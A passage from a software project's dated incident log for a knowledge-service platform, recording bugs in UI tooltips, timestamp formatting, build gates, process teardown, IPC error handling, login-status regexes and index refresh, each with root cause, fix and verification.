attempt reported *"`<div role="tooltip">`… from `<div data-radix-popper-content-wrapper>` subtree
intercepts pointer events"*. The control worked by hand on a first try, which is what made it look
like a flake.

**Root cause.** Radix's `Tooltip` renders its content inside a **popper wrapper**, and with hoverable
content enabled — the default — that wrapper is given `pointer-events: auto` so a person can move the
mouse *into* the tooltip. The workspace switcher wraps its whole `SelectField` in a `Tip`. In the
sidebar's foot the select opened upward, away from the tooltip; moved into the app strip (D56) it
opens **downward**, straight under a tooltip that is still open from the click that opened it. The
tooltip then sat on top of its own options list and ate every click.

**Why no test caught it before.** Nothing had: the arrangement did not exist until the control moved.
The unit suite drives `WorkspaceSwitcher` in isolation with no strip above it, so the two poppers
never met — the defect lives in the *geometry of the assembled window*, which is exactly the class
Playwright over the shipped bundle exists to catch, and it caught it on the first run.

**Fix.** `disableHoverableContent` on `Tooltip.Root` inside `Tip` — in `ui.tsx`, once, for every
tooltip in the platform. Nothing here is meant to be hovered into; each `Tip` carries one sentence.
Adding `pointer-events-none` to the tooltip's own content was tried first and **did not work**, which
is the informative half: the class lands on the content and the wrapper is a different element.

**The trap to inherit.** **Moving a control changes which way its popup opens**, and a component that
was safe in one corner of the window is not automatically safe in another — a tooltip and a menu that
never overlapped can start overlapping with no change to either. And when a click retries for thirty
seconds against something *visible, enabled and stable*, read the interceptor the error names rather
than reaching for a wait: the message said which element it was, on the first run.

## A refusal printed local time and called it UTC, and a fixture with an expiry date hid it (2026-09-21)

**Symptom.** Five checks in the family rehearsal's "which commit speaks" phase went red on a run that
changed nothing near them. The refusal read: *"`atelier` is already fed from a newer commit
(`754c583c`, 2026-09-21 **20:34Z**…)"* — on a machine whose UTC time was 10:34.

**Two root causes, and the second hid the first.**

The **fixture had an expiry date.** The phase fed a hard-coded `2026-09-21T10:00:00+00:00` as the
"newer" commit and compared it against a commit the driver had just made. That holds only while the
rehearsal runs *before* 10:00 UTC on that date. It passed all morning and aged out at lunchtime, with
nothing wrong in the product — the same class as a test that only passes on one machine, and the
reason it took a careful read rather than a bisect to believe.

The **sentence was wrong about time.** `{held.CommittedAt:yyyy-MM-dd HH:mm}Z` formats a
`DateTimeOffset` **in its own offset** and then hard-appends `Z`. A commit carries the committer's
offset, so the message printed a local wall clock and labelled it UTC. The ordering underneath was
right — the comparison uses the real instants — and only its *explanation* was wrong, which is the
worst shape for a sentence whose entire job is to convince a person that being refused is fine.

**Why no test caught it.** Every case in `FeedTests` fed `Z` times, so the offset was always zero and
the formatting was never exercised. The bug needed a non-zero offset to become visible, and nothing
in the suite had one.

**Fix.** `.UtcDateTime` before formatting, with a test that feeds `22:30+10:00` and asserts the
message says `12:30Z` and *not* `22:30Z` — watched failing first. The rehearsal's timestamps are now
relative to the run (`hoursFromNow(1)`, `(-48)`, `(24)`) instead of wall-clock literals.

**The traps to inherit.** A fixture that encodes an absolute date encodes an expiry date; make times
relative to the run unless the test is *about* a specific instant. And **a format string that appends
a timezone letter is a claim** — if the code writes `Z`, something has to convert to UTC, and the
only way to know it does is a test whose input is not already UTC.

## The publish build had been broken for two commits, and every gate was green (2026-09-21)

**Symptom.** `npm run rehearse` — the "would a release work?" gate — died at its first step, `npm pack`,
with `src/connect.ts(10,10): error TS6133: 'dirname' is declared but its value is never read.` Found
only because the budget work changed `check`'s exit semantics and the rehearsals were re-run to prove
nothing else moved.

**Root cause, in two halves.** The import went unused in SURF3 (`476a8a0`), two commits earlier. And
**nothing in the loop typechecks**: Node 24 strips types, so `node --test` runs the sources without
compiling them, and `npm run verify` ran the suite, `check`, the budgets and the version agreement —
none of which invoke `tsc`. The compiler only runs inside `prepack`, which only runs when packing, so
a type error reaches a release and nothing before it. `npm run typecheck` existed in the package all
along and was wired to nothing — and had itself never been green, failing on five test-tier errors
from importing an untyped workspace tool.

**Fix.** Remove the unused import; make the test-tier errors go away at their one site (an
`@ts-expect-error` on the untyped `.mjs` import and three annotated callbacks, rather than a
hand-written declaration that would be a second description of the tool to keep in step); and wire
`npm run typecheck -w daoris` into `verify` as its **first** step, so the cheapest and most
fundamental check fails first. Watched failing by re-introducing the exact import: the gate names the
file, the line and the symbol.

**The trap to inherit.** This is the fifth shape in `claims-need-checks` — *nothing runs the check* —
found the day it was written into the canon, in the same repository, about a different tool. A
compiler in the dependency tree is not a gate; a script in `package.json` is not a gate; **only what
the command people actually run invokes is a gate.** The tell was available and unread: a `typecheck`
script that no other script named.

## The desktop dev loop orphaned a service host on every restart (2026-09-21)

**Symptom.** `dotnet build src/Daoris.Service/Daoris.Service.Http` failed on a file copy: MSB3027,
"the file is locked by: daoris-knowledge-http (22216), daoris-knowledge-http (20600)". Two hosts from
this workspace's build were running with no window anywhere — and nobody had started them by hand.

**Root cause.** `tools/desktop.mjs kill|restart` stopped the shell with `Stop-Process -Force`. The
shell **owns** the host it spawns (`OnStopping`: end the driver loop, then `HostSupervisor.Stop()`),
and a forced kill skips that path entirely, so each restart left a host behind holding its port, its
store and a file lock on the assemblies the next build must overwrite. Every run of the day's tooling
added one. Nothing reported it, because an orphaned host answers `/api/status` perfectly well.

**Fix.** Close the main window first — the same path a person's × takes — and wait; force only as the
backstop after eight seconds. The tool still **never touches a host directly**: a host it did not
start belongs to whoever did, which is the distinction the supervisor itself draws (adopt, never
double-start). `doctor` now names a host running with no shell of this checkout, and says whose it
might be, rather than killing it.

**The trap to inherit:** a forced kill is not "the same thing, faster" for any process that owns
another. The teardown *is* the feature. And the damage here was invisible until an unrelated build
failed, which is how orphan bugs are usually found — count what is running before assuming a stop
stopped something.

## Every desktop refusal reached the person as a generic failure (2026-09-20)

**Symptom.** Found by the first tests the shell's IPC modules had ever had. A module refuses by
throwing with a written sentence — "`aurora` needs both an address and a key", "unknown adapter
'codex' — one of: claude-code, stub", "the driver is still coming up" — and **none of those sentences
reached the page.** The bridge answered `UNKNOWN_ERROR` carrying one parameter: the exception TYPE.
Five deliberate refusals, plus every `DriverException` the driver library raises, all rendered as the
same blank failure.

**Root cause.** Two halves that each looked right. The host maps an *unhandled* exception to a generic
code by design — its contract is a structured `code` + `parameters`, translated client-side
(`errors.{code}`), with `Message` documented as "untranslated fallback for logs/dev; not for end
users". The page, meanwhile, showed `(error as Error).message` — correct for the HTTP service, whose
refusals are prose rendered verbatim, and wrong for the bridge, which was never speaking prose.
Neither half was obviously broken on its own.

**Why it survived.** The page's own suite mocks the bridge and asserts the mock's invented string, so
it proved the page renders what it is given and nothing about what it is given. The host half had no
test project at all — 1,128 lines of shell behind a `net10.0-windows` TFM. **The contract was asserted
on neither side**, which is what a mock agreeing with a mock always means.

**Fix.** Refusals are declared once (`Refusals`) and thrown as `ShenoraException` with a code and
parameters; `DriverException` is mapped once at the module boundary to `DRIVER_REFUSED` carrying its
message, so the driver's own sentences travel verbatim — the same class as the service's, which this
platform has always shown word for word. The page gained one `sentence()` helper: a coded rejection
becomes `errors.{code}` interpolated, anything else stays the message it already was.

**Verification.** 39 tests in the new `Daoris.Desktop.Modules.Tests`, asserting the *code* rather than
the English (a refusal identified by its sentence is one no other language can render), plus a
catalogue test that every code a module can raise has an entry in **both** locale files — watched
failing before the entries existed. **The trap to inherit:** when two halves are mocked against each
other, the mock is the specification, and it is one nobody wrote down. Test the side that decides.

## A login-state pattern that matched its own negation (2026-09-20)

**Symptom.** Caught by a test written alongside SES3's harness descriptors, before anything ran: the
`codex` login check declared `in: /logged in/i` and `out: /not logged in/i`. The probe asks `in`
first, so **every logged-out profile reported as logged in** — "Not logged in" contains "logged in".

**Root cause.** The two supported harnesses answer the same question in two shapes. `claude auth
status` answers a FIELD (`"loggedIn": true` / `false`), where the two patterns are mutually exclusive
and order is irrelevant. `codex login status` answers a SENTENCE, where one answer is a superstring of
the other — so an unanchored pattern is not a test of the answer, it is a test of the vocabulary. The
descriptor was written by analogy with the field-shaped one, which is where the analogy stops holding.

**Fix.** Anchor it: `/^\s*logged in/im` and `/^\s*not logged in/im`. The `m` flag matters too — the
harness prints a warning line before the answer when its home does not exist.

**Verification.** The assertion that fails is `assert.ok(!codex.in.test('Not logged in'))`, watched
failing against the original pattern; a second case pins the warning-line form. The guarantee this
protects is the whole logged-out refusal: with the original pattern, a spawn onto an account nobody
had signed into would have proceeded silently and failed inside the harness instead of refusing with
the sentence that fixes it. **The trap to inherit:** when a check has a positive and a negative
pattern, assert the negative input against the POSITIVE pattern. Two patterns that each match their
own input prove nothing about the pair — and a sentence-shaped answer usually contains its own
negation.

## A surface crashed on a host answering an unexpected shape — twice now (2026-09-20)

**Symptom.** SES3's harness roster called `roster.data.harnesses.map(...)`; the existing shell test
suite mocks the bridge to answer one object for every request, so the machine settings page threw and
took the wiring card down with it. SES1 hit the identical failure in the session drawer, where a
mocked bridge answering the wrong object crashed the console.

**Root cause.** A page and a shell are versioned independently: **a shell older than a surface answers
a request it has never heard of with something else entirely**, and a mocked bridge is the same shape
as that older shell, which is why the tests find it. The failure is not the missing data — it is that
a new, optional capability took down the surface it was added to.

**Fix.** Validate the shape before using it (`Array.isArray(...) ? ... : null`) and render nothing when
it is not there; the rest of the page stands. Applied to the roster, the per-conversation profile
picker, and — since SES1 — the console.

**Verification.** `an answer that is not a roster leaves the wiring card standing` (now *…draws no
tools, and takes the page down with it nowhere*, `shell.test.tsx`) and its SES1 twin,
each driven by a bridge deliberately answering the wrong object. **The trap to inherit, now on its
second occurrence:** every new IPC request is an optional capability, so **the surface consuming it
must degrade to absent, never to a crash** — and the test that proves it is a bridge answering the
wrong shape, not a bridge answering nothing.

## `keys mint` indexed the server's own disk (2026-09-20)

**Symptom.** Caught by WSP3's new rehearsal phase, on its first run: a workspace's shared deployment
answered a registry containing seventeen repositories from the developer's own machine — every
sibling checkout in the folder above this one, this repository included — all of them in workspace
`default`, on a host that serves `aurora` and had never been fed anything but two scratch
repositories. The check that failed was the new "every row landed in the workspace the deployment IS".

**Root cause.** `KeysConsole` opened the deployment with `ServiceFactory.CreateAsync(options)`, and
that composition performs WSP2's once-per-store bootstrap import from the configured root (D48 §3).
The key console runs before any mode is passed down, so it composed as a LOCAL deployment: minting a
key on a server registered whatever sat beside the binary — **machine paths included** — into a store
that must be fed and never scanned (D47 §4). Two guards were in place and neither could see it: the
route refusals and the empty-source composition apply to the *serving* process, and the rehearsal's
byte-scan of the remote store looked for the fixture path, which these rows did not contain because
they were real.

**Fix.** `ServiceFactory.OpenKeysAsync` opens the SQLite store and the key store, and nothing else —
key administration has no business touching an index, and the narrow door is also the honest one.

**Verification.** The new check `Key_administration_never_bootstraps_a_registry` was watched failing
with the console's old call restored, then passing; the family rehearsal went 111/112 → 112/112 on the
same change. **The trap to inherit:** a convenience composition is a *behaviour*, not a wiring detail.
`CreateAsync` grew a side effect in WSP2 — a legitimate one — and every existing caller inherited it
silently, including one whose whole job was to print a credential and exit. When a factory acquires a
side effect, its callers are the change's blast radius; enumerate them in the same commit, and prefer
a narrow door for a caller that needs one field of what it opened.

## `refresh` re-read the repositories, never the folder (2026-09-20)

**Symptom.** Caught by WSP1's new rehearsal phase: two repositories born mid-run were registered,
scoped and addressable — and their knowledge answered no search at all. `POST /api/refresh` reported
success and a plausible entry count; nothing said a word about the two it had not looked at.

**Root cause.** `FileSystemKnowledgeSource.UnderFolder` enumerated the root's subdirectories **once,
when the source was constructed** — at host startup — and `ReadAsync` then re-scanned exactly that
list. So `knowledge_refresh`, whose stated promise is "re-read every repository from disk and rebuild
the index", re-read only the repositories that existed when the process launched. A project created
today was invisible until someone restarted the host. The registry never had the bug (it enumerates
per read), which is what made the failure so confusing: the repository was listed, declared and
quest-addressable while contributing nothing to the index.

**Fix.** The source holds the *folder*, not a snapshot of it: the constructor takes a
`Func<IReadOnlyList<string>>` and `UnderFolder` enumerates inside it, so every read lists the
directory afresh. The explicit-list constructor stays for a fixed set of roots.

**Verification.** Red first (`A_repository_that_appeared_after_startup_is_read_by_the_next_refresh` —
`["elder"]` where `["elder", "newborn"]` was expected), then green; the family rehearsal went 86/87 →
87/87 on the same change. **The trap to inherit:** this is the ghost rule's mirror image, and it fails
the same way — by looking fine. A ghost is data that outlived its source; this was a source that never
learned the world had grown. Anything that promises to "re-read from disk" must re-read *what is on
disk*, including what directory entries exist — a list captured at construction is a cache with no
invalidation and no name.

## The mirror-down fed itself back up, and an empty entries feed is a delete (2026-09-20)

**Symptom.** None yet — found by the post-redesign review (REV1), before any two-machine deployment
existed to lose data on. On the second tick after a remote sync, machine B's shared knowledge on the
remote would have been replaced with an empty set by machine A.

**Root cause.** `RemoteSyncPayloads.Joined` selected feed-up candidates on the `joined` flag alone,
and the mirror-down writes foreign registrations into the local registry carrying that same flag. The
next tick's feed-up loop therefore included the teammate's repository; this machine has no checkout of
it, `/api/entries` answered `[]`, and the entries feed is deliberately a replacement ("a repository
that deleted its knowledge means the deletion") — so the teammate's content was wiped by a machine
that never had it. The rehearsal missed it because its knowledge assertions ran before the pull that
plants the foreign row.

**Fix.** Feed-up requires a root: the local host answers roots to its loopback caller, and a checkout
is exactly what a root means — so a rootless joined row is a foreign one by construction, and the
authority stays with the machine that holds the checkout (D47 §5).

**Verification.** Red first (`A_mirrored_down_row_never_feeds_back_up`, on a fixture registry carrying
a rootless joined row), then green; the family rehearsal's remote phase stays 75/75. **The trap to
inherit:** a flag that travels with mirrored data cannot also be the selector for what feeds back —
pick a field the mirror structurally cannot carry.

## A shared deployment scanned its own disk through index-on-first-use (2026-09-20)

**Symptom.** None witnessed — found by the same review. A fresh shared host's first request (any read,
or the first feed against an empty store) would have scanned `DAORIS_KNOWLEDGE_ROOT` — defaulting to
the tree near the binary — and served whatever it found to every keyed caller.

**Root cause.** "A shared deployment is fed, not scanned" was enforced at one door: `/api/refresh`
answers 409 in shared mode. But `KnowledgeService.EnsureIndexedAsync` indexes on first use when the
store is empty, and every read and feed path funnels through it — the property held only for callers
who happened to hit the refused route first. The rehearsal masked it by pointing the shared host at an
empty scratch root.

**Fix.** The source became a composition choice like the embedder: shared mode composes
`EmptyKnowledgeSource`, so never-scans is true by construction rather than by route. The rehearsal now
plants a decoy repository beside the shared host and asserts it stays unserved.

**Verification.** The new check watched red under sabotage (source forced back to the filesystem:
74/75, exactly the decoy check) and green with the fix (75/75). **The trap to inherit:** a refusal at
a route is not a property of the deployment — anything "the deployment never does" belongs in its
composition, where no request ordering can route around it.

## A stale `dist/` shadowed the CLI sources in every gate that drives the `bin` (2026-09-20)

**Symptom.** DRV5's remote rehearsal failed at the sync: the registry showed a repository whose
manifest declared `remote.join: true` as `joined: false`, so nothing fed the remote. The service unit
tests and `npm test` were all green — only the gate that runs the real `bin/daoris.mjs` disagreed.

**Root cause.** `bin/daoris.mjs` prefers a built `dist/cli.js` over `src/cli.ts` (a consumer's Node
may be 22 and not strip types). A `prepack` from an earlier session had left a `dist/` on disk — **it
is gitignored, so it was invisible to `git status`** — carrying the pre-DRV5 `connect.js`, which had
no `join`/`shareKnowledge` in its payload. `node --test` runs the `.ts` sources directly and never
touched `dist/`, so every source-level gate passed while every `bin`-driven gate silently ran
month-old code. The split was masked for landings 1–5 because none of their gates exercised the new
connect fields; landing 6 was the first to drive the `bin` through the remote declaration.

**Fix.** Removed the stale `dist/`. The dev loop needs no build (D-conventions: Node 24 strips types),
so a `dist/` present outside a release is always stale and always shadowing.

**Verification.** `connect --dry-run` against a `remote`-declaring manifest now prints `join`/
`shareKnowledge` from the sources; the remote rehearsal phase went green. **The trap to inherit:** a
green `npm test` with a red `bin`-driven gate is the signature — suspect `dist/` first, and note that
`git status` will not show it because it is gitignored build output.

**Closed structurally 2026-09-20 (REV1).** The manual fix left the mechanism intact: `postpack` claimed
`--clean` and `stage-package.mjs` read no arguments, so every local `npm run rehearse` re-manufactured
the leftovers. `--clean` now exists and removes `dist/` with the staged files, the release rehearsal
asserts nothing staged outlives the pack, and the named dry-run verification above is a test
(`connect --dry-run prints the exact payload…`), bin-independent.

## "Single file" leaves the SQLite native library behind (2026-09-19)

**Symptom.** The installed `daoris-knowledge.exe` died on first store open with `DllNotFoundException`
for `e_sqlite3` — after the same binary had appeared to work when probed from inside the workspace.

**Root cause.** `PublishSingleFile` bundles managed assemblies but places **native** libraries beside
the executable by default; the install step copied only the exe. The in-workspace probe masked it
twice over: a stdio host under a null stdin exits immediately and *cleanly* before touching the store,
which a naive probe reads as a crash — or as success.

**Fix.** `IncludeNativeLibrariesForSelfExtract=true` in `tools/service-publish.mjs`, making the file
genuinely single.

**Verification.** The installed binaries, run from a neutral working directory: the MCP host starts,
warns exactly when no root is named and only then, and exits cleanly on stdin close; the HTTP host
serves both the API and the page. Asserted on behaviour, not on the process staying alive.

## A repository that left the disk never left the index (2026-09-19)

**Symptom.** The platform's Overview served a repository renamed weeks earlier — dozens of entries,
indistinguishable from a live project — on the one surface whose job is telling a person what exists.

**Root cause.** `KnowledgeIndex.RefreshAsync` replaced entries per repository it FOUND and said
nothing about repositories it did not. Replace-what-you-saw is silent about the absent, and the
absent is exactly where ghosts live.

**Fix.** After replacing, any repository held by the store but missing from the scan is replaced with
an empty set — guarded on the scan having found at least one repository, because a scan that saw
nothing is a mis-set root far more often than a family that emptied, and "refresh wiped the index" is
the wrong answer to a wrong path.

**Verification.** Test red first (`RefreshTests.A_repository_that_left_the_source_leaves_the_index`),
then green, plus the saw-nothing guard case. Then proven on the real store: one refresh retired both
ghosts (16 → 14 repositories) and `/api/repositories` lists only what is on disk.

## The HTTP host's documented defaults were both untrue (2026-09-19)

**Symptom.** Launched exactly as the README says — `dotnet run --project …Http` — the host bound
port 5000 rather than the documented 5177, and its default family root resolved to the service's own
tree, whose subprojects would have been indexed as though they were the family.

**Root cause.** Two unbacked claims, the `claims-need-checks` shape. Nothing set the port, so
Kestrel's default won. And the root's "parent of the current directory" heuristic assumed the CWD was
the workspace — `dotnet run` sets the CWD to the project directory. Every earlier run had supplied
both by environment, so the defaults themselves had never once been exercised.

**Fix.** The host defaults its own URL to 5177 (an explicit `ASPNETCORE_URLS` still wins), and the
family root walks up from the binary to this workspace's manifest exactly as the MCP host already
did, with the old heuristic as the last resort.

**Verification.** Launched with no environment at all: right port, right family. The family rehearsal
re-ran after the change, 22/22. No store pollution had occurred — no request ever reached the
mis-rooted instance.
